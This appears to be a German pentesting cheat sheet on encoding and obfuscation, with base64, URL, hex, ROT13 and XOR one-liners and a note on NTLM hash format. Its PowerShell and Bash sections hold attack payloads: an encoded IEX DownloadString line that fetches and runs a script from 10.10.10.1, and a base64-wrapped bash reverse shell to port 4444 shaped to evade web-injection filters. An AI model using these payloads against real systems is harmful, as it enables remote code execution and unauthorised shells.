# 🔢 Encoding & Obfuscation

## Base64

```bash
# Encode
echo -n "string" | base64
echo "string" | base64 -w0           # ohne newline-wrap

# Decode
echo "c3RyaW5n" | base64 -d
```

## URL-Encoding

```bash
# Encode
python3 -c "from urllib.parse import quote; print(quote('hello world'))"
echo -n "hello world" | jq -sRr @uri

# Decode
python3 -c "from urllib.parse import unquote; print(unquote('hello%20world'))"
```

## Hex

```bash
# Encode
echo -n "string" | xxd -p
echo -n "string" | od -A n -t x1 | tr -d ' \n'

# Decode
echo "737472696e67" | xxd -p -r
```

## PowerShell Encoded Command

```bash
# Befehl muss UTF-16LE sein!
echo -n 'whoami' | iconv -t UTF-16LE | base64 -w0
# → dGdpAG8AYQBtAGkA

# Auf Windows ausführen
powershell -EncodedCommand <BASE64>
powershell -e <BASE64>
```

Python-Script dafür:
```python
import base64
cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.1/r.ps1")'
encoded = base64.b64encode(cmd.encode('utf-16le')).decode()
print(f'powershell -EncodedCommand {encoded}')
```

## Bash via Base64 (für Web-Injection)

```bash
# Original:
bash -c 'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1'

# Encoden:
echo -n 'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1' | base64 -w0
# → YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjEwLjEvNDQ0NCAwPiYx

# Im Web-Payload (vermeidet "/" und "&"):
bash -c "{echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjEwLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}"
```

## ROT13 / ROT47

```bash
echo "string" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

## XOR (single-byte)

```python
data = bytes.fromhex('...')
key = 0x42
print(bytes(b ^ key for b in data))
```

## NTLM-Hash format

```
LM:NT
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
└── leerer LM ──────────────────┘└── NTLM Hash für leeres PW ───┘

# Pass-the-Hash nimmt NTLM-Teil
```

## CyberChef

→ https://gchq.github.io/CyberChef/ — Drag & Drop für jede Konvertierung
